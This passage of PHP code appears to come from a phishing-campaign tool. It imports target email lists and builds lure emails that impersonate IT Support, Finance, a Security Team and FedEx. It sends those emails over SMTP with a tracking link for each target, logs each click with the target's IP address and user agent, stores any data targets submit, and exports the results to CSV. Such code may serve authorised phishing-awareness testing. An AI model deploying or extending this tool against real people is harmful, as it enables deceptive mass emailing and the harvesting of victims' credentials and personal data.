    public function importTargets($campaignId, $targets) {
        $count = 0;
        $stmt = $this->db->prepare("INSERT OR IGNORE INTO targets (campaign_id, email, name) VALUES (:cid, :email, :name)");
        if (!$stmt) {
            throw new RuntimeException("Prepare failed: " . $this->db->lastErrorMsg());
        }
        foreach ($targets as $t) {
            if (!filter_var($t['email'], FILTER_VALIDATE_EMAIL)) {
                continue;
            }
            $stmt->clear();
            $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
            $stmt->bindValue(':email', $t['email'], SQLITE3_TEXT);
            $stmt->bindValue(':name', $t['name'] ?? '', SQLITE3_TEXT);
            if ($stmt->execute()) {
                $count++;
            }
        }
        return $count;
    }

    public function generateEmailTemplate($type, $campaignName, $phishingLink) {
        $templates = [
            'password_reset' => "Subject: Password Expiry Notice\n\nDear {name},\n\nYour password for {campaign} will expire in 24 hours. Please reset it immediately: {link}\n\nIT Support",
            'invoice' => "Subject: Invoice #{rand}\n\nDear {name},\n\nPlease find attached invoice #{rand}. Click to view: {link}\n\nFinance Dept",
            'security_alert' => "Subject: Security Alert\n\nDear {name},\n\nWe detected unusual activity on your account. Verify now: {link}\n\nSecurity Team",
            'newsletter' => "Subject: Exclusive Offer\n\nHi {name},\n\nCheck out our latest news: {link}\n\nMarketing",
            'fedex' => "Subject: Package Delivery\n\nDear {name},\n\nYour package is waiting. Schedule delivery: {link}\n\nFedEx"
        ];
        $template = $templates[$type] ?? $templates['security_alert'];
        $template = str_replace('{campaign}', $campaignName, $template);
        $template = str_replace('{link}', $phishingLink, $template);
        $template = str_replace('{rand}', rand(1000,9999), $template);
        return $template;
    }

    public function sendEmails($campaignId, $smtpConfig = null) {
        if (!$this->config['enable_email']) {
            error_log("Email sending disabled. Would send emails for campaign $campaignId.");
            return 0;
        }

        $targets = $this->getTargets($campaignId);
        $campaign = $this->getCampaign($campaignId);
        if (!$campaign) {
            throw new InvalidArgumentException("Campaign not found.");
        }

        $linkBase = $this->getBaseUrl() . $campaign['clone_path'];
        $sent = 0;
        $mailer = $this->getMailer($smtpConfig ?: $this->config);

        foreach ($targets as $target) {
            $trackingLink = $linkBase . '?email=' . urlencode($target['email']);
            $emailBody = str_replace(['{name}', '{link}'], [$target['name'], $trackingLink], $campaign['email_template']);
            $subject = $this->extractSubject($emailBody);
            $body = preg_replace('/^Subject:.*\n\n?/', '', $emailBody);

            try {
                $mailer->clearAddresses();
                $mailer->addAddress($target['email'], $target['name']);
                $mailer->Subject = $subject;
                $mailer->Body = $body;
                $mailer->send();

                $stmt = $this->db->prepare("INSERT INTO emails (campaign_id, target_id, sent_at) VALUES (:cid, :tid, :time)");
                if (!$stmt) continue;
                $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
                $stmt->bindValue(':tid', $target['id'], SQLITE3_INTEGER);
                $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
                $stmt->execute();
                $sent++;
            } catch (Exception $e) {
                error_log("Failed to send to {$target['email']}: " . $e->getMessage());
            }
        }

        $stmt = $this->db->prepare("UPDATE campaigns SET emails_sent = emails_sent + :sent, launched_at = :time WHERE id = :id");
        if ($stmt) {
            $stmt->bindValue(':sent', $sent, SQLITE3_INTEGER);
            $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
            $stmt->bindValue(':id', $campaignId, SQLITE3_INTEGER);
            $stmt->execute();
        }
        return $sent;
    }

    private function getBaseUrl() {
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        $host = $_SERVER['HTTP_HOST'] ?? 'localhost';
        return $protocol . '://' . $host;
    }

    private function getMailer($config) {
        $mail = new PHPMailer(true);
        try {
            $mail->isSMTP();
            $mail->Host       = $config['smtp_host'];
            $mail->SMTPAuth   = true;
            $mail->Username   = $config['smtp_user'];
            $mail->Password   = $config['smtp_pass'];
            $mail->SMTPSecure = $config['smtp_encryption'];
            $mail->Port       = $config['smtp_port'];
            $mail->setFrom($config['from_email'], $config['from_name']);
            $mail->isHTML(false);
            $mail->CharSet = 'UTF-8';
        } catch (Exception $e) {
            error_log("PHPMailer configuration error: " . $e->getMessage());
            throw new RuntimeException("SMTP configuration error: " . $e->getMessage());
        }
        return $mail;
    }

    private function extractSubject($body) {
        if (preg_match('/^Subject:\s*(.+)$/m', $body, $matches)) {
            return trim($matches[1]);
        }
        return 'No Subject';
    }

    public function logClick($campaignId, $targetEmail, $ip, $ua) {
        $target = $this->getTargetByEmail($campaignId, $targetEmail);
        if ($target) {
            $stmt = $this->db->prepare("UPDATE targets SET clicked = 1, ip = :ip, user_agent = :ua, first_seen = :time WHERE id = :tid");
            if ($stmt) {
                $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
                $stmt->bindValue(':ua', $ua, SQLITE3_TEXT);
                $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
                $stmt->bindValue(':tid', $target['id'], SQLITE3_INTEGER);
                $stmt->execute();
            }
            $stmt = $this->db->prepare("UPDATE campaigns SET clicks = clicks + 1 WHERE id = :cid");
            if ($stmt) {
                $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
                $stmt->execute();
            }
        }
    }

    public function logSubmission($campaignId, $targetEmail, $data) {
        $target = $this->getTargetByEmail($campaignId, $targetEmail);
        if ($target) {
            $stmt = $this->db->prepare("UPDATE targets SET submitted = 1, data = :data, last_seen = :time WHERE id = :tid");
            if ($stmt) {
                $stmt->bindValue(':data', json_encode($data), SQLITE3_TEXT);
                $stmt->bindValue(':time', time(), SQLITE3_INTEGER);
                $stmt->bindValue(':tid', $target['id'], SQLITE3_INTEGER);
                $stmt->execute();
            }
            $stmt = $this->db->prepare("UPDATE campaigns SET submissions = submissions + 1 WHERE id = :cid");
            if ($stmt) {
                $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
                $stmt->execute();
            }
        }
    }

    private function getTargetByEmail($campaignId, $email) {
        $stmt = $this->db->prepare("SELECT id FROM targets WHERE campaign_id = :cid AND email = :email");
        if (!$stmt) return null;
        $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
        $stmt->bindValue(':email', $email, SQLITE3_TEXT);
        $res = $stmt->execute();
        return $res->fetchArray(SQLITE3_ASSOC);
    }

    public function getCampaign($id) {
        $stmt = $this->db->prepare("SELECT * FROM campaigns WHERE id = :id");
        if (!$stmt) return null;
        $stmt->bindValue(':id', $id, SQLITE3_INTEGER);
        $res = $stmt->execute();
        return $res->fetchArray(SQLITE3_ASSOC);
    }

    public function getCampaigns() {
        $res = $this->db->query("SELECT * FROM campaigns ORDER BY created_at DESC");
        $out = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $out[] = $row;
        return $out;
    }

    public function getTargets($campaignId, $limit = 1000, $offset = 0) {
        $stmt = $this->db->prepare("SELECT * FROM targets WHERE campaign_id = :cid ORDER BY id LIMIT :limit OFFSET :offset");
        if (!$stmt) return [];
        $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
        $stmt->bindValue(':limit', $limit, SQLITE3_INTEGER);
        $stmt->bindValue(':offset', $offset, SQLITE3_INTEGER);
        $res = $stmt->execute();
        $out = [];
        while ($row = $res->fetchArray(SQLITE3_ASSOC)) $out[] = $row;
        return $out;
    }

    public function getStats($campaignId) {
        $campaign = $this->getCampaign($campaignId);
        if (!$campaign) return null;

        $stmt = $this->db->prepare("SELECT COUNT(*) FROM targets WHERE campaign_id = :cid");
        if (!$stmt) return null;
        $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
        $total = $stmt->execute()->fetchArray(SQLITE3_NUM)[0];

        return [
            'campaign' => $campaign,
            'targets_total' => $total,
            'clicks' => $campaign['clicks'],
            'submissions' => $campaign['submissions'],
            'emails_sent' => $campaign['emails_sent']
        ];
    }

    public function deleteCampaign($campaignId) {
        $this->db->exec("BEGIN TRANSACTION");
        try {
            $stmt = $this->db->prepare("DELETE FROM emails WHERE campaign_id = :cid");
            if ($stmt) {
                $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
                $stmt->execute();
            }
            $stmt = $this->db->prepare("DELETE FROM targets WHERE campaign_id = :cid");
            if ($stmt) {
                $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
                $stmt->execute();
            }
            $stmt = $this->db->prepare("DELETE FROM campaigns WHERE id = :cid");
            if ($stmt) {
                $stmt->bindValue(':cid', $campaignId, SQLITE3_INTEGER);
                $stmt->execute();
            }
            $this->db->exec("COMMIT");
        } catch (Exception $e) {
            $this->db->exec("ROLLBACK");
            throw $e;
        }
    }

    public function exportResults($campaignId) {
        $targets = $this->getTargets($campaignId, 100000);
        $output = fopen('php://temp', 'w');
        fputcsv($output, ['Email', 'Name', 'Clicked', 'Submitted', 'IP', 'User Agent', 'First Seen', 'Last Seen', 'Data']);
        foreach ($targets as $t) {
            fputcsv($output, [
                $t['email'],
                $t['name'],
                $t['clicked'],
                $t['submitted'],
                $t['ip'],
                $t['user_agent'],
                $t['first_seen'] ? date('Y-m-d H:i:s', $t['first_seen']) : '',
                $t['last_seen'] ? date('Y-m-d H:i:s', $t['last_seen']) : '',
                $t['data']
            ]);
        }
        rewind($output);
        $csv = stream_get_contents($output);
        fclose($output);
        return $csv;
    }

